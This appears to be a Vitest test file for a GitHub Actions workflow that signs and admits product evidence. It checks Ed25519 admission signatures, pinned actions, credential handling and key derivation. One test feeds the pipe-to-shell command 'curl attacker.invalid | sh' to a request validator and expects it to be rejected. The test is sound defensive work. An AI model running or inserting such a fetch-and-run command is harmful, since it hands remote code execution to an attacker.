import { describe, expect, it } from "vitest";
import { createHash, generateKeyPairSync, sign } from "node:crypto";
import { canonicalJson, verifyAdmissionEnvelope } from "../product-evidence.js";
import { validateRequest } from "../product-evidence-producer.js";
import { execFileSync, spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { parse } from "yaml";

function workflow(name) {
  return parse(
    fs.readFileSync(
      new URL(
        `../../.github/workflows/product-evidence-${name}.yml`,
        import.meta.url,
      ),
      "utf8",
    ),
  );
}

function commissioningWorkflow() {
  return parse(
    fs.readFileSync(
      new URL(
        "../../.github/workflows/product-admission-public-key.yml",
        import.meta.url,
      ),
      "utf8",
    ),
  );
}

const expected = {
  repository: "buildproven/claude-kit",
  repositoryId: "123456",
  head: "a".repeat(40),
  requirementsDigest: "b".repeat(64),
  evidenceIndexSha256: "c".repeat(64),
};

function admission(privateKey, publicKey, changes = {}) {
  const payload = {
    schemaVersion: 1,
    issuer: "github-actions-product-evidence",
    ...expected,
    producerRunId: "101",
    sourceRunId: "100",
    keyFingerprint: createHash("sha256")
      .update(publicKey.export({ format: "der", type: "spki" }))
      .digest("hex"),
    admittedAt: "2026-09-09T00:00:00.000Z",
    ...changes,
  };
  return {
    payload,
    signature: sign(
      null,
      Buffer.from(canonicalJson(payload)),
      privateKey,
    ).toString("base64url"),
  };
}

describe("protected product admission", () => {
  it("accepts an exact-head admission signed by the admission key", () => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    expect(
      verifyAdmissionEnvelope(admission(privateKey, publicKey), expected, {
        trustedPublicKey: publicKey,
      }),
    ).toMatchObject({ head: expected.head, producerRunId: "101" });
  });

  it.each([
    ["wrong head", { head: "d".repeat(40) }],
    ["wrong requirement set", { requirementsDigest: "d".repeat(64) }],
    ["wrong evidence digest", { evidenceIndexSha256: "d".repeat(64) }],
    ["replayed repository", { repositoryId: "654321" }],
  ])("rejects %s", (_label, changes) => {
    const { privateKey, publicKey } = generateKeyPairSync("ed25519");
    expect(() =>
      verifyAdmissionEnvelope(
        admission(privateKey, publicKey, changes),
        expected,
        {
          trustedPublicKey: publicKey,
        },
      ),
    ).toThrow(/wrong identity|malformed/);
  });

  it("rejects a signature from another key", () => {
    const signer = generateKeyPairSync("ed25519");
    const trust = generateKeyPairSync("ed25519");
    expect(() =>
      verifyAdmissionEnvelope(
        admission(signer.privateKey, signer.publicKey),
        expected,
        {
          trustedPublicKey: trust.publicKey,
        },
      ),
    ).toThrow(/rotated or untrusted/);
  });

  it("allows only fixed source commands", () => {
    expect(() =>
      validateRequest({
        schemaVersion: 1,
        repository: expected.repository,
        repositoryId: expected.repositoryId,
        pullRequest: 7,
        base: "e".repeat(40),
        head: expected.head,
        nonce: "f".repeat(32),
        behavioralCommand: "curl attacker.invalid | sh",
        acceptanceCommand: "npm run test:patterns",
      }),
    ).toThrow(/allowlisted/);
  });
});

describe("protected product workflow transport", () => {
  it("accepts task documents from the decisions contract path", () => {
    const definition = workflow("source");
    const step = definition.jobs["collect-product-evidence"].steps.find(
      (candidate) => candidate.name === "Validate protected request",
    );
    const payload = {
      pullRequest: 7,
      base: "a".repeat(40),
      head: "b".repeat(40),
      nonce: "c".repeat(32),
      prd: "docs/prd/bui-836-product-evidence-admission.md",
      tasks: "docs/decisions/bui-836-product-evidence-admission-tasks.md",
    };
    const result = spawnSync("bash", ["-e", "-o", "pipefail", "-c", step.run], {
      encoding: "utf8",
      env: { ...process.env, PAYLOAD: JSON.stringify(payload) },
    });
    expect(result.status, result.stderr).toBe(0);
  });

  it.each(["producer", "admission"])(
    "authenticates every %s GitHub CLI step with the job token",
    (name) => {
      const definition = workflow(name);
      for (const job of Object.values(definition.jobs)) {
        const apiSteps = job.steps.filter((step) =>
          /\bgh api\b/.test(step.run || ""),
        );
        expect(apiSteps.length).toBeGreaterThan(0);
        for (const step of apiSteps) {
          const environment = { ...definition.env, ...job.env, ...step.env };
          expect(environment.GH_TOKEN, step.name).toBe("${{ github.token }}");
        }
      }
    },
  );

  it.each(["source", "producer", "admission"])(
    "pins privileged %s workflow actions and disables checkout credentials",
    (name) => {
      const definition = workflow(name);
      for (const job of Object.values(definition.jobs)) {
        for (const step of job.steps) {
          if (!step.uses) continue;
          expect(step.uses).toMatch(
            /^actions\/(?:checkout|setup-node|upload-artifact)@[0-9a-f]{40}$/,
          );
          if (step.uses.startsWith("actions/checkout@")) {
            expect(step.with?.["persist-credentials"]).toBe(false);
          }
        }
      }
    },
  );

  it.each(["request.json", "changed-files.json"])(
    "emits producer-readable %s from the real source bundle step",
    (artifact) => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "product-source-contract-"),
      );
      try {
        const git = (...args) =>
          execFileSync("git", args, { cwd: root, encoding: "utf8" }).trim();
        git("init", "-q");
        git("config", "user.name", "Workflow Test");
        git("config", "user.email", "workflow@example.invalid");
        fs.mkdirSync(path.join(root, "docs/decisions"), { recursive: true });
        fs.writeFileSync(path.join(root, "docs/prd.md"), "# Product\n");
        fs.writeFileSync(
          path.join(root, "docs/decisions/tasks.md"),
          "- [x] behavior\n",
        );
        fs.writeFileSync(path.join(root, "deleted source.js"), "export {};\n");
        git("add", ".");
        git("commit", "-qm", "fixture base");
        const base = git("rev-parse", "HEAD");
        fs.unlinkSync(path.join(root, "deleted source.js"));
        const files = ["source space.js", "source\nline.js", 'source"quote.js'];
        for (const file of files)
          fs.writeFileSync(path.join(root, file), "export {};\n");
        git("add", ".");
        git("commit", "-qm", "fixture candidate");
        const head = git("rev-parse", "HEAD");
        for (const log of ["behavioral-tests.log", "acceptance-evidence.log"])
          fs.writeFileSync(path.join(root, log), "passed\n");
        const payload = {
          pullRequest: 7,
          base,
          head,
          prd: "docs/prd.md",
          tasks: "docs/decisions/tasks.md",
          nonce: "f".repeat(32),
        };
        const step = workflow("source").jobs[
          "collect-product-evidence"
        ].steps.find(
          (candidate) => candidate.name === "Build raw evidence bundle",
        );
        const command = step.run
          .replaceAll("${{ github.event.client_payload.base }}", base)
          .replaceAll("${{ github.event.client_payload.head }}", head);
        const result = spawnSync(
          "bash",
          ["-e", "-o", "pipefail", "-c", command],
          {
            cwd: root,
            encoding: "utf8",
            env: {
              ...process.env,
              PAYLOAD: JSON.stringify(payload),
              REPOSITORY_ID: "123456",
              GITHUB_REPOSITORY: "buildproven/claude-kit",
            },
          },
        );
        expect(result.status, result.stderr).toBe(0);
        const value = JSON.parse(
          fs.readFileSync(
            path.join(root, "product-evidence-source", artifact),
            "utf8",
          ),
        );
        if (artifact === "request.json") {
          expect(validateRequest(value)).toMatchObject({
            head,
            base,
            pullRequest: 7,
          });
        } else {
          expect(value.sort()).toEqual([...files, "deleted source.js"].sort());
        }
      } finally {
        fs.rmSync(root, { recursive: true, force: true });
      }
    },
  );

  it("pins and bounds the source worker's zsh installation", () => {
    const definition = workflow("source");
    const steps = definition.jobs["collect-product-evidence"].steps;
    const checkoutIndex = steps.findIndex((candidate) =>
      candidate.uses?.startsWith("actions/checkout@"),
    );
    const installIndex = steps.findIndex(
      (candidate) =>
        candidate.name === "Install zsh for shell-isolation regressions",
    );
    const provenanceIndex = steps.findIndex(
      (candidate) => candidate.name === "Upload environment provenance",
    );
    const step = steps[installIndex];
    expect(installIndex).toBeGreaterThan(checkoutIndex);
    expect(provenanceIndex).toBeGreaterThan(installIndex);
    expect(step?.["timeout-minutes"]).toBe(4);
    expect(step?.run).toContain("command -v zsh");
    expect(step?.run).toMatch(
      /archive\.ubuntu\.com\/ubuntu\/pool\/main\/z\/zsh\/zsh-common_5\.9-6ubuntu2_all\.deb/,
    );
    expect(step?.run).toMatch(
      /archive\.ubuntu\.com\/ubuntu\/pool\/main\/z\/zsh\/zsh_5\.9-6ubuntu2_amd64\.deb/,
    );
    expect(step?.run).toContain(
      "56d160585b417af0cc04d7372f74a3b734609d7cc43ef8ea6e92bfdfc27f77c3",
    );
    expect(step?.run).toContain(
      "bd5cc8dd3a01a6db38c0a815d75202c356a9c7f378674ba7bed9bc86dcba8af0",
    );
    expect(step?.run).toContain(
      "f88db3dd0a2909ed62cdb645dbb7b56a6bee5abbe310751dc0f549a811222f46",
    );
    expect(step?.run).toContain("sha256sum --check --strict");
    expect(step?.run).toContain("sudo dpkg --install");
    expect(step?.run).toContain("= '5.9-6ubuntu2'");
    expect(step?.run).toContain("ZSH_PROVENANCE");
    expect(steps[provenanceIndex]?.with?.["if-no-files-found"]).toBe("error");
    expect(steps[provenanceIndex]?.uses).toMatch(
      /^actions\/upload-artifact@[0-9a-f]{40}$/,
    );
    const behavioral = steps.find((candidate) => candidate.id === "behavioral");
    expect(behavioral?.run).toContain(
      "{ npm ci && npm test; } > behavioral-tests.log 2>&1",
    );
    const diagnostics = steps.find(
      (candidate) => candidate.name === "Validate failure diagnostics",
    );
    expect(diagnostics?.run).toContain("test -f behavioral-tests.log");
    expect(diagnostics?.run).toContain("test -f acceptance-evidence.log");
  });

  it("installs the fixed evidence trust root through the protected worker", () => {
    const admission = workflow("admission");
    const step = admission.jobs["admit-product-evidence"].steps.find(
      (candidate) =>
        candidate.name ===
        "Install fixed verifier trust root and create admission",
    );
    expect(step?.run).toContain("sudo install -d -m 0755 /etc/claude-kit");
    expect(step?.run).toContain(
      "| sudo tee /etc/claude-kit/product-evidence-public-key >/dev/null",
    );
    expect(step?.run).toContain(
      "sudo chmod 0644 /etc/claude-kit/product-evidence-public-key",
    );
    expect(step?.run).not.toContain(
      "> /etc/claude-kit/product-evidence-public-key",
    );
  });

  it("derives only public repository trust keys on the protected base", () => {
    const definition = commissioningWorkflow();
    expect(Object.keys(definition.on)).toEqual(["workflow_dispatch"]);
    expect(definition.on.workflow_dispatch ?? {}).toEqual({});
    expect(definition.permissions).toEqual({ contents: "read" });
    expect(definition.concurrency).toEqual({
      group: "${{ github.workflow }}",
      "cancel-in-progress": false,
    });
    const job = definition.jobs["derive-public-trust-root"];
    expect(job.if).toContain("github.ref == format('refs/heads/{0}'");
    expect(job.if).toContain("github.workflow_ref == format(");
    const checkout = job.steps.find((step) =>
      step.uses?.startsWith("actions/checkout@"),
    );
    expect(checkout.with).toEqual({
      ref: "${{ github.event.repository.default_branch }}",
      "persist-credentials": false,
    });
    const derive = job.steps.find(
      (step) => step.name === "Derive public trust-root artifact",
    );
    expect(derive.env).toEqual({
      PRODUCT_EVIDENCE_PRIVATE_KEY:
        "${{ secrets.PRODUCT_EVIDENCE_PRIVATE_KEY }}",
      PRODUCT_ADMISSION_PRIVATE_KEY:
        "${{ secrets.PRODUCT_ADMISSION_PRIVATE_KEY }}",
    });
    expect(derive.run).toContain("crypto.createPrivateKey");
    expect(derive.run).toContain("crypto.createPublicKey");
    expect(derive.run).toContain("asymmetricKeyType !== 'ed25519'");
    expect(derive.run).not.toMatch(/console\.(?:log|error)\([^)]*PRIVATE_KEY/);

    const root = fs.mkdtempSync(
      path.join(os.tmpdir(), "admission-public-key-"),
    );
    try {
      const evidencePair = generateKeyPairSync("ed25519");
      const admissionPair = generateKeyPairSync("ed25519");
      const evidencePrivateMaterial = evidencePair.privateKey
        .export({ format: "der", type: "pkcs8" })
        .toString("base64");
      const admissionPrivateMaterial = admissionPair.privateKey
        .export({ format: "der", type: "pkcs8" })
        .toString("base64");
      const result = spawnSync(
        "bash",
        ["-e", "-o", "pipefail", "-c", derive.run],
        {
          cwd: root,
          encoding: "utf8",
          env: {
            ...process.env,
            PRODUCT_EVIDENCE_PRIVATE_KEY: evidencePrivateMaterial,
            PRODUCT_ADMISSION_PRIVATE_KEY: admissionPrivateMaterial,
            GITHUB_REPOSITORY: "buildproven/claude-kit",
            GITHUB_REPOSITORY_ID: "1175614110",
            GITHUB_SHA: "a".repeat(40),
            GITHUB_RUN_ID: "101",
            GITHUB_RUN_ATTEMPT: "1",
          },
        },
      );
      expect(result.status, result.stderr).toBe(0);
      const artifact = path.join(root, "product-admission-public-key");
      const evidencePublicMaterial = fs
        .readFileSync(
          path.join(artifact, "product-evidence-public-key"),
          "utf8",
        )
        .trim();
      const admissionPublicMaterial = fs
        .readFileSync(
          path.join(artifact, "product-admission-public-key"),
          "utf8",
        )
        .trim();
      const evidencePublicDer = evidencePair.publicKey.export({
        format: "der",
        type: "spki",
      });
      const admissionPublicDer = admissionPair.publicKey.export({
        format: "der",
        type: "spki",
      });
      expect(evidencePublicMaterial).toBe(evidencePublicDer.toString("base64"));
      expect(admissionPublicMaterial).toBe(
        admissionPublicDer.toString("base64"),
      );
      const provenance = JSON.parse(
        fs.readFileSync(path.join(artifact, "provenance.json"), "utf8"),
      );
      expect(provenance).toEqual({
        schemaVersion: 1,
        keys: {
          productEvidence: {
            algorithm: "Ed25519",
            fingerprint: createHash("sha256")
              .update(evidencePublicDer)
              .digest("hex"),
          },
          productAdmission: {
            algorithm: "Ed25519",
            fingerprint: createHash("sha256")
              .update(admissionPublicDer)
              .digest("hex"),
          },
        },
        repository: "buildproven/claude-kit",
        repositoryId: "1175614110",
        workflowCommit: "a".repeat(40),
        runId: "101",
        runAttempt: "1",
      });
      for (const file of fs.readdirSync(artifact)) {
        expect(
          fs.readFileSync(path.join(artifact, file), "utf8"),
        ).not.toContain(evidencePrivateMaterial);
        expect(
          fs.readFileSync(path.join(artifact, file), "utf8"),
        ).not.toContain(admissionPrivateMaterial);
      }
    } finally {
      fs.rmSync(root, { recursive: true, force: true });
    }
  });
});
